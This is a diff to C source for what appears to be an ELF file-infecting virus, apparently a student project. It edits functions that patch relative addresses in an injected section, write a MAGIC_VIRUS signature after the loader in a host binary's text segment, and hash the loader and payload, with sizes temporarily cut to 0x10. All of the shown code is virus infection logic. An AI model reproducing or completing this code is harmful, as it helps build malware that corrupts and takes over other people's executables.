@@ -127,13 +127,13 @@ static void	patch_addresses(t_info *info)
 
 	// &ft_memcpy
 	start = info->addr_bis + OFFSET_2 + 4;
-	end = (int32_t)(info->addr_bis);
+	end = (int32_t)(info->addr_bis + BIS_SIZE);
 	val = end - start;
 	ft_memcpy(info->file + info->offset_bis + OFFSET_2, &val, 4);
 
-	// &ft_end
+	// &syscalls
 	start = info->addr_bis + OFFSET_3 + 4;
-	end = (int32_t)(info->text_addr + info->text_size + LOADER_SIZE);
+	end = (int32_t)(info->addr_bis);
 	val = end - start;
 	ft_memcpy(info->file + info->offset_bis + OFFSET_3, &val, 4);
 
@@ -174,6 +174,9 @@ static int		inject_sign(t_info *info)
 	uint32_t	magic = MAGIC_VIRUS;
 	char		buf[0x40];
 
+// 	write_begin(buf);
+// 	ft_syswrite(1, buf, 8);
+	
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, &magic, 4);
 	write_sign(buf);
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4, buf, SIGN_SIZE);
@@ -217,7 +220,7 @@ uint32_t	hash_loader(t_info *info)
 	unsigned char	*str;
 
 	str = (unsigned char *)(info->text_begin + info->text_size);
-	size = 0xc5; //a modifier taille du loader
+	size = 0x10; //a modifier taille du loader 0xc5
 
 	size_t i = 0;
 	while (i < size)
@@ -231,7 +234,7 @@ uint32_t	hash_loader(t_info *info)
 
 
 	str = (unsigned char *)(info->file + info->offset_bis);
-	size = 0x1F4F; // BIS _SIZE + PAYLOAD SIZE a modifier
+	size = 0x10; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
 	
 	i = 0;
 	while (i < size)
